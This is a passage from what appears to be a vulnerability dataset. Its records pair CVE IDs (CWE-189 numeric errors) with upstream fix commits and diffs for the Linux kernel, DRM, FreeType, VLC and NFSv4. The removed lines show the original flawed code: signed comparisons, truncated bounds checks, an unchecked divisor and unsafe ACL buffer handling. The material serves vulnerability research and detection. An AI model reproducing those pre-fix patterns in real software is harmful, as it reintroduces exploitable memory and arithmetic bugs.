%2\":\"=a\"(dum2), \"=d\"(*rem)\n-\t    : \"rm\"(div), \"A\"(divs));\n-\n-\treturn dum2;\n-\n-}\n-\n static inline u64 div_u64_rem(u64 dividend, u32 divisor, u32 *remainder)\n {\n \tunion {\ndiff --git a\/include\/linux\/calc64.h b\/include\/linux\/calc64.h\ndeleted file mode 100644\nindex ebf4b8f38d88..000000000000\n--- a\/include\/linux\/calc64.h\n+++ \/dev\/null\n@@ -1,49 +0,0 @@\n-#ifndef _LINUX_CALC64_H\n-#define _LINUX_CALC64_H\n-\n-#include <linux\/types.h>\n-#include <asm\/div64.h>\n-\n-\/*\n- * This is a generic macro which is used when the architecture\n- * specific div64.h does not provide a optimized one.\n- *\n- * The 64bit dividend is divided by the divisor (data type long), the\n- * result is returned and the remainder stored in the variable\n- * referenced by remainder (data type long *). In contrast to the\n- * do_div macro the dividend is kept intact.\n- *\/\n-#ifndef div_long_long_rem\n-#define div_long_long_rem(dividend, divisor, remainder)\t\\\n-\tdo_div_llr((dividend), divisor, remainder)\n-\n-static inline unsigned long do_div_llr(const long long dividend,\n-\t\t\t\t       const long divisor, long *remainder)\n-{\n-\tu64 result = dividend;\n-\n-\t*(remainder) = do_div(result, divisor);\n-\treturn (unsigned long) result;\n-}\n-#endif\n-\n-\/*\n- * Sign aware variation of the above. On some architectures a\n- * negative dividend leads to an divide overflow exception, which\n- * is avoided by the sign check.\n- *\/\n-static inline long div_long_long_rem_signed(const long long dividend,\n-\t\t\t\t\t    const long divisor, long *remainder)\n-{\n-\tlong res;\n-\n-\tif (unlikely(dividend < 0)) {\n-\t\tres = -div_long_long_rem(-dividend, divisor, remainder);\n-\t\t*remainder = -(*remainder);\n-\t} else\n-\t\tres = div_long_long_rem(dividend, divisor, remainder);\n-\n-\treturn res;\n-}\n-\n-#endif\ndiff --git a\/include\/linux\/jiffies.h b\/include\/linux\/jiffies.h\nindex 33ef710dac24..abb6ac639e8e 100644\n--- a\/include\/linux\/jiffies.h\n+++ b\/include\/linux\/jiffies.h\n@@ -1,7 +1,7 @@\n #ifndef _LINUX_JIFFIES_H\n #define _LINUX_JIFFIES_H\n \n-#include <linux\/calc64.h>\n+#include <linux\/math64.h>\n #include <linux\/kernel.h>\n #include <linux\/types.h>\n #include <linux\/time.h>\ndiff --git a\/kernel\/posix-cpu-timers.c b\/kernel\/posix-cpu-timers.c\nindex ae5c6c147c4b..f1525ad06cb3 100644\n--- a\/kernel\/posix-cpu-timers.c\n+++ b\/kernel\/posix-cpu-timers.c\n@@ -4,8 +4,9 @@\n \n #include <linux\/sched.h>\n #include <linux\/posix-timers.h>\n-#include <asm\/uaccess.h>\n #include <linux\/errno.h>\n+#include <linux\/math64.h>\n+#include <asm\/uaccess.h>\n \n static int check_clock(const clockid_t which_clock)\n {\n@@ -47,12 +48,10 @@ static void sample_to_timespec(const clockid_t which_clock,\n \t\t\t       union cpu_time_count cpu,\n \t\t\t       struct timespec *tp)\n {\n-\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED) {\n-\t\ttp->tv_sec = div_long_long_rem(cpu.sched,\n-\t\t\t\t\t       NSEC_PER_SEC, &tp->tv_nsec);\n-\t} else {\n+\tif (CPUCLOCK_WHICH(which_clock) == CPUCLOCK_SCHED)\n+\t\t*tp = ns_to_timespec(cpu.sched);\n+\telse\n \t\tcputime_to_timespec(cpu.cpu, tp);\n-\t}\n }\n \n static inline int cpu_time_before(const clockid_t which_clock,\ndiff --git a\/kernel\/time.c b\/kernel\/time.c\nindex 343e2515375a..cbe0d5a222ff 100644\n--- a\/kernel\/time.c\n+++ b\/kernel\/time.c\n@@ -392,13 +392,17 @@ EXPORT_SYMBOL(set_normalized_timespec);\n struct timespec ns_to_timespec(const s64 nsec)\n {\n \tstruct timespec ts;\n+\ts32 rem;\n \n \tif (!nsec)\n \t\treturn (struct timespec) {0, 0};\n \n-\tts.tv_sec = div_long_long_rem_signed(nsec, NSEC_PER_SEC, &ts.tv_nsec);\n-\tif (unlikely(nsec < 0))\n-\t\tset_normalized_timespec(&ts, ts.tv_sec, ts.tv_nsec);\n+\tts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);\n+\tif (unlikely(rem < 0)) {\n+\t\tts.tv_sec--;\n+\t\trem += NSEC_PER_SEC;\n+\t}\n+\tts.tv_nsec = rem;\n \n \treturn ts;\n }\n@@ -528,8 +532,10 @@ jiffies_to_timespec(const unsigned long jiffies, struct timespec *value)\n \t * Convert jiffies to nanoseconds and separate with\n \t * one divide.\n \t *\/\n-\tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &value->tv_nsec);\n+\tu32 rem;\n+\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,\n+\t\t\t\t    NSEC_PER_SEC, &rem);\n+\tvalue->tv_nsec = rem;\n }\n EXPORT_SYMBOL(jiffies_to_timespec);\n \n@@ -567,12 +573,11 @@ void jiffies_to_timeval(const unsigned long jiffies, struct timeval *value)\n \t * Convert jiffies to nanoseconds and separate with\n \t * one divide.\n \t *\/\n-\tu64 nsec = (u64)jiffies * TICK_NSEC;\n-\tlong tv_usec;\n+\tu32 rem;\n \n-\tvalue->tv_sec = div_long_long_rem(nsec, NSEC_PER_SEC, &tv_usec);\n-\ttv_usec \/= NSEC_PER_USEC;\n-\tvalue->tv_usec = tv_usec;\n+\tvalue->tv_sec = div_u64_rem((u64)jiffies * TICK_NSEC,\n+\t\t\t\t    NSEC_PER_SEC, &rem);\n+\tvalue->tv_usec = rem \/ NSEC_PER_USEC;\n }\n EXPORT_SYMBOL(jiffies_to_timeval);\n \ndiff --git a\/kernel\/time\/ntp.c b\/kernel\/time\/ntp.c\nindex a4492f3d64db..dbd6f8905614 100644\n--- a\/kernel\/time\/ntp.c\n+++ b\/kernel\/time\/ntp.c\n@@ -234,7 +234,7 @@ static inline void notify_cmos_timer(void) { }\n  *\/\n int do_adjtimex(struct timex *txc)\n {\n-\tlong mtemp, save_adjust, rem;\n+\tlong mtemp, save_adjust;\n \ts64 freq_adj;\n \tint result;\n \n@@ -345,9 +345,7 @@ int do_adjtimex(struct timex *txc)\n \t\t    freq_adj += time_freq;\n \t\t    freq_adj = min(freq_adj, (s64)MAXFREQ_NSEC);\n \t\t    time_freq = max(freq_adj, (s64)-MAXFREQ_NSEC);\n-\t\t    time_offset = div_long_long_rem_signed(time_offset,\n-\t\t\t\t\t\t\t   NTP_INTERVAL_FREQ,\n-\t\t\t\t\t\t\t   &rem);\n+\t\t    time_offset = div_s64(time_offset, NTP_INTERVAL_FREQ);\n \t\t    time_offset <<= SHIFT_UPDATE;\n \t\t} \/* STA_PLL *\/\n \t    } \/* txc->modes & ADJ_OFFSET *\/\ndiff --git a\/mm\/slub.c b\/mm\/slub.c\nindex 70db2897c1ea..32b62623846a 100644\n--- a\/mm\/slub.c\n+++ b\/mm\/slub.c\n@@ -22,6 +22,7 @@\n #include <linux\/debugobjects.h>\n #include <linux\/kallsyms.h>\n #include <linux\/memory.h>\n+#include <linux\/math64.h>\n \n \/*\n  * Lock order:\n@@ -3621,12 +3622,10 @@ static int list_locations(struct kmem_cache *s, char *buf,\n \t\t\tlen += sprintf(buf + len, \"<not-available>\");\n \n \t\tif (l->sum_time != l->min_time) {\n-\t\t\tunsigned long remainder;\n-\n \t\t\tlen += sprintf(buf + len, \" age=%ld\/%ld\/%ld\",\n-\t\t\tl->min_time,\n-\t\t\tdiv_long_long_rem(l->sum_time, l->count, &remainder),\n-\t\t\tl->max_time);\n+\t\t\t\tl->min_time,\n+\t\t\t\t(long)div_u64(l->sum_time, l->count),\n+\t\t\t\tl->max_time);\n \t\t} else\n \t\t\tlen += sprintf(buf + len, \" age=%ld\",\n \t\t\t\tl->min_time);\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"torvalds","repo":"linux","source":"cve"},{"CVE_ID":"CVE-2011-1013","CWE_ID":"189","category":"security","commit_id":"1922756124ddd53846877416d92ba4a802bc658f","commit_message":"From 1922756124ddd53846877416d92ba4a802bc658f Mon Sep 17 00:00:00 2001\nFrom: Dave Airlie <airlied@redhat.com>\nDate: Thu, 24 Feb 2011 08:35:06 +1000\nSubject: drm: fix unsigned vs signed comparison issue in modeset ctl ioctl.\n\nThis fixes CVE-2011-1013.\n\nReported-by: Matthiew Herrb (OpenBSD X.org team)\nCc: stable@kernel.org\nSigned-off-by: Dave Airlie <airlied@redhat.com>\n---\n drivers\/gpu\/drm\/drm_irq.c | 3 ++-\n include\/drm\/drmP.h        | 2 +-\n 2 files changed, 3 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/drivers\/gpu\/drm\/drm_irq.c b\/drivers\/gpu\/drm\/drm_irq.c\nindex 53120a72a48c..28d1d3c24d65 100644\n--- a\/drivers\/gpu\/drm\/drm_irq.c\n+++ b\/drivers\/gpu\/drm\/drm_irq.c\n@@ -1012,7 +1012,8 @@ int drm_modeset_ctl(struct drm_device *dev, void *data,\n \t\t    struct drm_file *file_priv)\n {\n \tstruct drm_modeset_ctl *modeset = data;\n-\tint crtc, ret = 0;\n+\tint ret = 0;\n+\tunsigned int crtc;\n \n \t\/* If drm_vblank_init() hasn't been called yet, just no-op *\/\n \tif (!dev->num_crtcs)\ndiff --git a\/include\/drm\/drmP.h b\/include\/drm\/drmP.h\nindex fe29aadb129d..348843b80150 100644\n--- a\/include\/drm\/drmP.h\n+++ b\/include\/drm\/drmP.h\n@@ -1101,7 +1101,7 @@ struct drm_device {\n \tstruct platform_device *platformdev; \/**< Platform device struture *\/\n \n \tstruct drm_sg_mem *sg;\t\/**< Scatter gather memory *\/\n-\tint num_crtcs;                  \/**< Number of CRTCs on this device *\/\n+\tunsigned int num_crtcs;                  \/**< Number of CRTCs on this device *\/\n \tvoid *dev_private;\t\t\/**< device private data *\/\n \tvoid *mm_private;\n \tstruct address_space *dev_mapping;\n-- \ncgit 1.2-0.3.lf.el7\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2010-2807","CWE_ID":"189","category":"security","commit_id":"346f1867fd32dae8f56e5b482d1af98f626804ac","commit_message":"From 346f1867fd32dae8f56e5b482d1af98f626804ac Mon Sep 17 00:00:00 2001\nFrom: Werner Lemberg <wl@gnu.org>\nDate: Fri, 6 Aug 2010 00:47:57 +0200\nSubject: Fix Savannah bug #30657.\n\n* src\/truetype\/ttinterp.c (BOUNDSL): New macro.\nChange `BOUNDS' to `BOUNDSL' where appropriate.\n\n* src\/truetype\/ttinterp.h (TT_ExecContextRec): Fix type of\n`cvtSize'.\n---\n ChangeLog               |  10 +++++\n src\/truetype\/ttinterp.c | 103 ++++++++++++++++++++++++------------------------\n src\/truetype\/ttinterp.h |   2 +-\n 3 files changed, 63 insertions(+), 52 deletions(-)\n\n","diff_code":"diff --git a\/ChangeLog b\/ChangeLog\nindex 4235ffb..83cc3d9 100644\n--- a\/ChangeLog\n+++ b\/ChangeLog\n@@ -1,5 +1,15 @@\n 2010-08-05  Werner Lemberg  <wl@gnu.org>\n \n+\tFix Savannah bug #30657.\n+\n+\t* src\/truetype\/ttinterp.c (BOUNDSL): New macro.\n+\tChange `BOUNDS' to `BOUNDSL' where appropriate.\n+\n+\t* src\/truetype\/ttinterp.h (TT_ExecContextRec): Fix type of\n+\t`cvtSize'.\n+\n+2010-08-05  Werner Lemberg  <wl@gnu.org>\n+\n \tFix Savannah bug #30656.\n \n \t* src\/type42\/t42parse.c (t42_parse_sfnts): Protect against negative\ndiff --git a\/src\/truetype\/ttinterp.c b\/src\/truetype\/ttinterp.c\nindex 3e108f4..d22e94f 100644\n--- a\/src\/truetype\/ttinterp.c\n+++ b\/src\/truetype\/ttinterp.c\n@@ -224,9 +224,10 @@\n \n   \/*************************************************************************\/\n   \/*                                                                       *\/\n-  \/* A simple bounds-checking macro.                                       *\/\n+  \/* Two simple bounds-checking macros.                                    *\/\n   \/*                                                                       *\/\n-#define BOUNDS( x, n )  ( (FT_UInt)(x) >= (FT_UInt)(n) )\n+#define BOUNDS( x, n )   ( (FT_UInt)(x)  >= (FT_UInt)(n)  )\n+#define BOUNDSL( x, n )  ( (FT_ULong)(x) >= (FT_ULong)(n) )\n \n #undef  SUCCESS\n #define SUCCESS  0\n@@ -3281,39 +3282,39 @@\n     args[0] = FT_PIX_CEIL( args[0] );\n \n \n-#define DO_RS                          \\\n-   {                                   \\\n-     FT_ULong  I = (FT_ULong)args[0];  \\\n-                                       \\\n-                                       \\\n-     if ( BOUNDS( I, CUR.storeSize ) ) \\\n-     {                                 \\\n-       if ( CUR.pedantic_hinting )     \\\n-       {                               \\\n-         ARRAY_BOUND_ERROR;            \\\n-       }                               \\\n-       else                            \\\n-         args[0] = 0;                  \\\n-     }                                 \\\n-     else                              \\\n-       args[0] = CUR.storage[I];       \\\n+#define DO_RS                           \\\n+   {                                    \\\n+     FT_ULong  I = (FT_ULong)args[0];   \\\n+                                        \\\n+                                        \\\n+     if ( BOUNDSL( I, CUR.storeSize ) ) \\\n+     {                                  \\\n+       if ( CUR.pedantic_hinting )      \\\n+       {                                \\\n+         ARRAY_BOUND_ERROR;             \\\n+       }                                \\\n+       else                             \\\n+         args[0] = 0;                   \\\n+     }                                  \\\n+     else                               \\\n+       args[0] = CUR.storage[I];        \\\n    }\n \n \n-#define DO_WS                          \\\n-   {                                   \\\n-     FT_ULong  I = (FT_ULong)args[0];  \\\n-                                       \\\n-                                       \\\n-     if ( BOUNDS( I, CUR.storeSize ) ) \\\n-     {                                 \\\n-       if ( CUR.pedantic_hinting )     \\\n-       {                               \\\n-         ARRAY_BOUND_ERROR;            \\\n-       }                               \\\n-     }                                 \\\n-     else                              \\\n-       CUR.storage[I] = args[1];       \\\n+#define DO_WS                           \\\n+   {                                    \\\n+     FT_ULong  I = (FT_ULong)args[0];   \\\n+                                        \\\n+                                        \\\n+     if ( BOUNDSL( I, CUR.storeSize ) ) \\\n+     {                                  \\\n+       if ( CUR.pedantic_hinting )      \\\n+       {                                \\\n+         ARRAY_BOUND_ERROR;             \\\n+       }                                \\\n+     }                                  \\\n+     else                               \\\n+       CUR.storage[I] = args[1];        \\\n    }\n \n \n@@ -3322,7 +3323,7 @@\n      FT_ULong  I = (FT_ULong)args[0];    \\\n                                          \\\n                                          \\\n-     if ( BOUNDS( I, CUR.cvtSize ) )     \\\n+     if ( BOUNDSL( I, CUR.cvtSize ) )    \\\n      {                                   \\\n        if ( CUR.pedantic_hinting )       \\\n        {                                 \\\n@@ -3341,7 +3342,7 @@\n      FT_ULong  I = (FT_ULong)args[0];    \\\n                                          \\\n                                          \\\n-     if ( BOUNDS( I, CUR.cvtSize ) )     \\\n+     if ( BOUNDSL( I, CUR.cvtSize ) )    \\\n      {                                   \\\n        if ( CUR.pedantic_hinting )       \\\n        {                                 \\\n@@ -3358,7 +3359,7 @@\n      FT_ULong  I = (FT_ULong)args[0];                           \\\n                                                                 \\\n                                                                 \\\n-     if ( BOUNDS( I, CUR.cvtSize ) )                            \\\n+     if ( BOUNDSL( I, CUR.cvtSize ) )                           \\\n      {                                                          \\\n        if ( CUR.pedantic_hinting )                              \\\n        {                                                        \\\n@@ -4679,7 +4680,7 @@\n     \/* first of all, check the index *\/\n \n     F = args[0];\n-    if ( BOUNDS( F, CUR.maxFunc + 1 ) )\n+    if ( BOUNDSL( F, CUR.maxFunc + 1 ) )\n       goto Fail;\n \n     \/* Except for some old Apple fonts, all functions in a TrueType *\/\n@@ -4755,7 +4756,7 @@\n \n     \/* first of all, check the index *\/\n     F = args[1];\n-    if ( BOUNDS( F, CUR.maxFunc + 1 ) )\n+    if ( BOUNDSL( F, CUR.maxFunc + 1 ) )\n       goto Fail;\n \n     \/* Except for some old Apple fonts, all functions in a TrueType *\/\n@@ -5030,7 +5031,7 @@\n \n     L = (FT_ULong)args[0];\n \n-    if ( BOUNDS( L, CUR.zp2.n_points ) )\n+    if ( BOUNDSL( L, CUR.zp2.n_points ) )\n     {\n       if ( CUR.pedantic_hinting )\n       {\n@@ -5114,8 +5115,8 @@\n     K = (FT_UShort)args[1];\n     L = (FT_UShort)args[0];\n \n-    if( BOUNDS( L, CUR.zp0.n_points ) ||\n-        BOUNDS( K, CUR.zp1.n_points ) )\n+    if ( BOUNDS( L, CUR.zp0.n_points ) ||\n+         BOUNDS( K, CUR.zp1.n_points ) )\n     {\n       if ( CUR.pedantic_hinting )\n       {\n@@ -5769,12 +5770,12 @@\n   static void\n   Ins_SHZ( INS_ARG )\n   {\n-    TT_GlyphZoneRec zp;\n-    FT_UShort       refp;\n-    FT_F26Dot6      dx,\n-                    dy;\n+    TT_GlyphZoneRec  zp;\n+    FT_UShort        refp;\n+    FT_F26Dot6       dx,\n+                     dy;\n \n-    FT_UShort       last_point, i;\n+    FT_UShort        last_point, i;\n \n \n     if ( BOUNDS( args[0], 2 ) )\n@@ -5976,8 +5977,8 @@\n     cvtEntry = (FT_ULong)args[1];\n     point    = (FT_UShort)args[0];\n \n-    if ( BOUNDS( point,    CUR.zp0.n_points ) ||\n-         BOUNDS( cvtEntry, CUR.cvtSize )      )\n+    if ( BOUNDS( point,     CUR.zp0.n_points ) ||\n+         BOUNDSL( cvtEntry, CUR.cvtSize )      )\n     {\n       if ( CUR.pedantic_hinting )\n         CUR.error = TT_Err_Invalid_Reference;\n@@ -6169,7 +6170,7 @@\n     \/* XXX: UNDOCUMENTED! cvt[-1] = 0 always *\/\n \n     if ( BOUNDS( point,      CUR.zp1.n_points ) ||\n-         BOUNDS( cvtEntry,   CUR.cvtSize + 1 )  ||\n+         BOUNDSL( cvtEntry,  CUR.cvtSize + 1 )  ||\n          BOUNDS( CUR.GS.rp0, CUR.zp0.n_points ) )\n     {\n       if ( CUR.pedantic_hinting )\n@@ -6420,8 +6421,8 @@\n     p1 = (FT_UShort)args[0];\n     p2 = (FT_UShort)args[1];\n \n-    if ( BOUNDS( args[0], CUR.zp1.n_points ) ||\n-         BOUNDS( args[1], CUR.zp0.n_points ) )\n+    if ( BOUNDS( p1, CUR.zp1.n_points ) ||\n+         BOUNDS( p2, CUR.zp0.n_points ) )\n     {\n       if ( CUR.pedantic_hinting )\n         CUR.error = TT_Err_Invalid_Reference;\n@@ -6950,7 +6951,7 @@\n       A = (FT_ULong)CUR.stack[CUR.args + 1];\n       B = CUR.stack[CUR.args];\n \n-      if ( BOUNDS( A, CUR.cvtSize ) )\n+      if ( BOUNDSL( A, CUR.cvtSize ) )\n       {\n         if ( CUR.pedantic_hinting )\n         {\ndiff --git a\/src\/truetype\/ttinterp.h b\/src\/truetype\/ttinterp.h\nindex 732a1f2..c480dfa 100644\n--- a\/src\/truetype\/ttinterp.h\n+++ b\/src\/truetype\/ttinterp.h\n@@ -150,7 +150,7 @@ FT_BEGIN_HEADER\n \n     FT_Bool            step_ins;  \/* true if the interpreter must *\/\n                                   \/* increment IP after ins. exec *\/\n-    FT_Long            cvtSize;\n+    FT_ULong           cvtSize;\n     FT_Long*           cvt;\n \n     FT_UInt            glyphSize; \/* glyph instructions buffer size *\/\n-- \ncgit v1.0-41-gc330\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2014-1684","CWE_ID":"189","category":"security","commit_id":"98787d0843612271e99d62bee0dfd8197f0cf404","commit_message":"From 98787d0843612271e99d62bee0dfd8197f0cf404 Mon Sep 17 00:00:00 2001\nFrom: Francois Cartegnie <fcvlcdev@free.fr>\nDate: Wed, 27 Nov 2013 14:17:24 +0100\nSubject: [PATCH] demux: asf: add packet values check.\n\ndiv by zero in many places\n---\n modules\/demux\/asf\/libasf.c | 4 ++--\n 1 file changed, 2 insertions(+), 2 deletions(-)\n\n","diff_code":"diff --git a\/modules\/demux\/asf\/libasf.c b\/modules\/demux\/asf\/libasf.c\nindex c9070d514a..6e19e471b1 100644\n--- a\/modules\/demux\/asf\/libasf.c\n+++ b\/modules\/demux\/asf\/libasf.c\n@@ -319,8 +319,8 @@ static int ASF_ReadObject_file_properties( stream_t *s, asf_object_t *p_obj )\n     p_fp->i_send_duration = GetQWLE( p_peek + 72 );\n     p_fp->i_preroll = GetQWLE( p_peek + 80 );\n     p_fp->i_flags = GetDWLE( p_peek + 88 );\n-    p_fp->i_min_data_packet_size = GetDWLE( p_peek + 92 );\n-    p_fp->i_max_data_packet_size = GetDWLE( p_peek + 96 );\n+    p_fp->i_min_data_packet_size = __MAX( GetDWLE( p_peek + 92 ), (uint32_t) 1 );\n+    p_fp->i_max_data_packet_size = __MAX( GetDWLE( p_peek + 96 ), (uint32_t) 1 );\n     p_fp->i_max_bitrate = GetDWLE( p_peek + 100 );\n \n #ifdef ASF_DEBUG\n-- \n2.11.0\n\n","owner":"NA","repo":"NA","source":"cve"},{"CVE_ID":"CVE-2011-4131","CWE_ID":"189","category":"security","commit_id":"bf118a342f10dafe44b14451a1392c3254629a1f","commit_message":"From bf118a342f10dafe44b14451a1392c3254629a1f Mon Sep 17 00:00:00 2001\nFrom: Andy Adamson <andros@netapp.com>\nDate: Wed, 7 Dec 2011 11:55:27 -0500\nSubject: NFSv4: include bitmap in nfsv4 get acl data\n\nThe NFSv4 bitmap size is unbounded: a server can return an arbitrary\nsized bitmap in an FATTR4_WORD0_ACL request.  Replace using the\nnfs4_fattr_bitmap_maxsz as a guess to the maximum bitmask returned by a server\nwith the inclusion of the bitmap (xdr length plus bitmasks) and the acl data\nxdr length to the (cached) acl page data.\n\nThis is a general solution to commit e5012d1f \"NFSv4.1: update\nnfs4_fattr_bitmap_maxsz\" and fixes hitting a BUG_ON in xdr_shrink_bufhead\nwhen getting ACLs.\n\nFix a bug in decode_getacl that returned -EINVAL on ACLs > page when getxattr\nwas called with a NULL buffer, preventing ACL > PAGE_SIZE from being retrieved.\n\nCc: stable@kernel.org\nSigned-off-by: Andy Adamson <andros@netapp.com>\nSigned-off-by: Trond Myklebust <Trond.Myklebust@netapp.com>\n---\n fs\/nfs\/nfs4proc.c          | 96 +++++++++++++++++++++++++++-------------------\n fs\/nfs\/nfs4xdr.c           | 31 +++++++++++----\n include\/linux\/nfs_xdr.h    |  5 +++\n include\/linux\/sunrpc\/xdr.h |  2 +\n net\/sunrpc\/xdr.c           |  3 +-\n 5 files changed, 89 insertions(+), 48 deletions(-)\n\n","diff_code":"diff --git a\/fs\/nfs\/nfs4proc.c b\/fs\/nfs\/nfs4proc.c\nindex fcc2408d7ab0..3b1080118452 100644\n--- a\/fs\/nfs\/nfs4proc.c\n+++ b\/fs\/nfs\/nfs4proc.c\n@@ -3426,19 +3426,6 @@ static inline int nfs4_server_supports_acls(struct nfs_server *server)\n  *\/\n #define NFS4ACL_MAXPAGES (XATTR_SIZE_MAX >> PAGE_CACHE_SHIFT)\n \n-static void buf_to_pages(const void *buf, size_t buflen,\n-\t\tstruct page **pages, unsigned int *pgbase)\n-{\n-\tconst void *p = buf;\n-\n-\t*pgbase = offset_in_page(buf);\n-\tp -= *pgbase;\n-\twhile (p < buf + buflen) {\n-\t\t*(pages++) = virt_to_page(p);\n-\t\tp += PAGE_CACHE_SIZE;\n-\t}\n-}\n-\n static int buf_to_pages_noslab(const void *buf, size_t buflen,\n \t\tstruct page **pages, unsigned int *pgbase)\n {\n@@ -3535,9 +3522,19 @@ out:\n \tnfs4_set_cached_acl(inode, acl);\n }\n \n+\/*\n+ * The getxattr API returns the required buffer length when called with a\n+ * NULL buf. The NFSv4 acl tool then calls getxattr again after allocating\n+ * the required buf.  On a NULL buf, we send a page of data to the server\n+ * guessing that the ACL request can be serviced by a page. If so, we cache\n+ * up to the page of ACL data, and the 2nd call to getxattr is serviced by\n+ * the cache. If not so, we throw away the page, and cache the required\n+ * length. The next getxattr call will then produce another round trip to\n+ * the server, this time with the input buf of the required size.\n+ *\/\n static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t buflen)\n {\n-\tstruct page *pages[NFS4ACL_MAXPAGES];\n+\tstruct page *pages[NFS4ACL_MAXPAGES] = {NULL, };\n \tstruct nfs_getaclargs args = {\n \t\t.fh = NFS_FH(inode),\n \t\t.acl_pages = pages,\n@@ -3552,41 +3549,60 @@ static ssize_t __nfs4_get_acl_uncached(struct inode *inode, void *buf, size_t bu\n \t\t.rpc_argp = &args,\n \t\t.rpc_resp = &res,\n \t};\n-\tstruct page *localpage = NULL;\n-\tint ret;\n+\tint ret = -ENOMEM, npages, i, acl_len = 0;\n \n-\tif (buflen < PAGE_SIZE) {\n-\t\t\/* As long as we're doing a round trip to the server anyway,\n-\t\t * let's be prepared for a page of acl data. *\/\n-\t\tlocalpage = alloc_page(GFP_KERNEL);\n-\t\tresp_buf = page_address(localpage);\n-\t\tif (localpage == NULL)\n-\t\t\treturn -ENOMEM;\n-\t\targs.acl_pages[0] = localpage;\n-\t\targs.acl_pgbase = 0;\n-\t\targs.acl_len = PAGE_SIZE;\n-\t} else {\n-\t\tresp_buf = buf;\n-\t\tbuf_to_pages(buf, buflen, args.acl_pages, &args.acl_pgbase);\n+\tnpages = (buflen + PAGE_SIZE - 1) >> PAGE_SHIFT;\n+\t\/* As long as we're doing a round trip to the server anyway,\n+\t * let's be prepared for a page of acl data. *\/\n+\tif (npages == 0)\n+\t\tnpages = 1;\n+\n+\tfor (i = 0; i < npages; i++) {\n+\t\tpages[i] = alloc_page(GFP_KERNEL);\n+\t\tif (!pages[i])\n+\t\t\tgoto out_free;\n+\t}\n+\tif (npages > 1) {\n+\t\t\/* for decoding across pages *\/\n+\t\targs.acl_scratch = alloc_page(GFP_KERNEL);\n+\t\tif (!args.acl_scratch)\n+\t\t\tgoto out_free;\n \t}\n-\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode), &msg, &args.seq_args, &res.seq_res, 0);\n+\targs.acl_len = npages * PAGE_SIZE;\n+\targs.acl_pgbase = 0;\n+\t\/* Let decode_getfacl know not to fail if the ACL data is larger than\n+\t * the page we send as a guess *\/\n+\tif (buf == NULL)\n+\t\tres.acl_flags |= NFS4_ACL_LEN_REQUEST;\n+\tresp_buf = page_address(pages[0]);\n+\n+\tdprintk(\"%s  buf %p buflen %ld npages %d args.acl_len %ld\\n\",\n+\t\t__func__, buf, buflen, npages, args.acl_len);\n+\tret = nfs4_call_sync(NFS_SERVER(inode)->client, NFS_SERVER(inode),\n+\t\t\t     &msg, &args.seq_args, &res.seq_res, 0);\n \tif (ret)\n \t\tgoto out_free;\n-\tif (res.acl_len > args.acl_len)\n-\t\tnfs4_write_cached_acl(inode, NULL, res.acl_len);\n+\n+\tacl_len = res.acl_len - res.acl_data_offset;\n+\tif (acl_len > args.acl_len)\n+\t\tnfs4_write_cached_acl(inode, NULL, acl_len);\n \telse\n-\t\tnfs4_write_cached_acl(inode, resp_buf, res.acl_len);\n+\t\tnfs4_write_cached_acl(inode, resp_buf + res.acl_data_offset,\n+\t\t\t\t      acl_len);\n \tif (buf) {\n \t\tret = -ERANGE;\n-\t\tif (res.acl_len > buflen)\n+\t\tif (acl_len > buflen)\n \t\t\tgoto out_free;\n-\t\tif (localpage)\n-\t\t\tmemcpy(buf, resp_buf, res.acl_len);\n+\t\t_copy_from_pages(buf, pages, res.acl_data_offset,\n+\t\t\t\tres.acl_len);\n \t}\n-\tret = res.acl_len;\n+\tret = acl_len;\n out_free:\n-\tif (localpage)\n-\t\t__free_page(localpage);\n+\tfor (i = 0; i < npages; i++)\n+\t\tif (pages[i])\n+\t\t\t__free_page(pages[i]);\n+\tif (args.acl_scratch)\n+\t\t__free_page(args.acl_scratch);\n \treturn ret;\n }\n \n@@ -3617,6 +3633,8 @@ static ssize_t nfs4_proc_get_acl(struct inode *inode, void *buf, size_t buflen)\n \t\tnfs_zap_acl_cache(inode);\n \tret = nfs4_read_cached_acl(inode, buf, buflen);\n \tif (ret != -ENOENT)\n+\t\t\/* -ENOENT is returned if there is no ACL or if there is an ACL\n+\t\t * but no cached acl data, just the acl length *\/\n \t\treturn ret;\n \treturn nfs4_get_acl_uncached(inode, buf, buflen);\n }\ndiff --git a\/fs\/nfs\/nfs4xdr.c b\/fs\/nfs\/nfs4xdr.c\nindex e6161b213ed1..dcaf69309d8e 100644\n--- a\/fs\/nfs\/nfs4xdr.c\n+++ b\/fs\/nfs\/nfs4xdr.c\n@@ -2517,11 +2517,13 @@ static void nfs4_xdr_enc_getacl(struct rpc_rqst *req, struct xdr_stream *xdr,\n \tencode_compound_hdr(xdr, req, &hdr);\n \tencode_sequence(xdr, &args->seq_args, &hdr);\n \tencode_putfh(xdr, args->fh, &hdr);\n-\treplen = hdr.replen + op_decode_hdr_maxsz + nfs4_fattr_bitmap_maxsz + 1;\n+\treplen = hdr.replen + op_decode_hdr_maxsz + 1;\n \tencode_getattr_two(xdr, FATTR4_WORD0_ACL, 0, &hdr);\n \n \txdr_inline_pages(&req->rq_rcv_buf, replen << 2,\n \t\targs->acl_pages, args->acl_pgbase, args->acl_len);\n+\txdr_set_scratch_buffer(xdr, page_address(args->acl_scratch), PAGE_SIZE);\n+\n \tencode_nops(&hdr);\n }\n \n@@ -4957,17 +4959,18 @@ decode_restorefh(struct xdr_stream *xdr)\n }\n \n static int decode_getacl(struct xdr_stream *xdr, struct rpc_rqst *req,\n-\t\tsize_t *acl_len)\n+\t\t\t struct nfs_getaclres *res)\n {\n-\t__be32 *savep;\n+\t__be32 *savep, *bm_p;\n \tuint32_t attrlen,\n \t\t bitmap[3] = {0};\n \tstruct kvec *iov = req->rq_rcv_buf.head;\n \tint status;\n \n-\t*acl_len = 0;\n+\tres->acl_len = 0;\n \tif ((status = decode_op_hdr(xdr, OP_GETATTR)) != 0)\n \t\tgoto out;\n+\tbm_p = xdr->p;\n \tif ((status = decode_attr_bitmap(xdr, 